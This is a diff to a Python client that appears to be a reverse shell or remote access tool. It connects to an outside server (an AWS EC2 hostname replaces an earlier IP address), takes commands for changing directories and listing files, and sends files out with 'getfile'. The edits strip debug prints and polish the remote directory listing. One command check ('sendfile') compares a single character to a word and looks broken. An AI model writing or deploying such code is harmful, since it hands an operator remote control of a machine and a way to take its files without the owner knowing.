@@ -8,7 +8,7 @@ HEADER = 400
 PORT_SHELL = 887
 PORT_FILE = 888
 SERVER = "127.0.0.1"
-SERVER = "46.101.213.187"
+SERVER = "ec2-18-159-212-217.eu-central-1.compute.amazonaws.com"
 FORMAT = "utf-8"
 DISCONNECT_MESSAGE = "!DISCONNECT"
 ADDR_SHELL = (SERVER, PORT_SHELL)
@@ -42,7 +42,6 @@ def send(conn, msg):
         conn.send(msg_encoded)
     except:
         raise
-    print(msg_encoded.decode(FORMAT))
 
 
 def send_large_response(msg, conn):
@@ -51,7 +50,6 @@ def send_large_response(msg, conn):
     cursor = 1024
     while buffer:
         conn.send(buffer)
-        print(buffer)
         buffer = msg[cursor:cursor+1024].encode(FORMAT)
         cursor += 1024
 
@@ -129,7 +127,6 @@ def main():
             command = ""
             output = ""
             if not is_still_connected(server_conn):
-                print("abc")
                 break
             try:
                 command = receive(server_conn)
@@ -153,17 +150,15 @@ def main():
                 # cd command, change directory
                 try:
                     os.chdir(' '.join(split_command[1:]))
+                    output = os.getcwd()
                 except:
                     # if there is an error, set as the output
                     output = "directory not found"
-                else:
-                    # if operation is successful, empty message
-                    output = ""
             elif split_command[0] == "getfile":
                 send_file(" ".join(split_command[1:]))
                 continue
             elif split_command[0] == "dir":
-                send(server_conn, "\n".join((x + " | " + format_size(os.path.getsize(x))) for x in os.listdir(os.getcwd())))
+                send(server_conn, "\n".join((x + " | " + (format_size(os.path.getsize(x)))*os.path.isfile(x) + "DIR"*(not os.path.isfile(x))) for x in os.listdir(os.getcwd())))
                 continue
             elif command[0] == "sendfile":
                 recv_file(server_conn)
